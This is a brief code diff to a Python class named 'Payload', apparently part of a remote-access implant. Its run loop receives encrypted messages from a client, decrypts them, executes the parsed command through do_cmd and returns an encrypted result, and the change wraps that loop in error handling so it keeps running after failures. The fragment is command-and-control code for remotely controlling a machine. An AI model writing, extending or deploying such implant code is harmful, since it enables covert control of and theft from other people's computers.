@@ -38,9 +38,12 @@ class Payload(object):
 			return False
 	def run(self):
 		while True:
-			recv = self.client.recv()
-			dec = self.decrypt(recv)
-			cmd = json.loads(dec)
-			res = {'res':self.do_cmd(cmd)}
-			enc = self.encrypt(json.dumps(res).encode())
-			self.client.send(enc)
+			try:
+				recv = self.client.recv()
+				dec = self.decrypt(recv)
+				cmd = json.loads(dec)
+				res = {'res':self.do_cmd(cmd)}
+				enc = self.encrypt(json.dumps(res).encode())
+				self.client.send(enc)
+			except Exception as e:
+				print("[ERROR]: ",str(e))
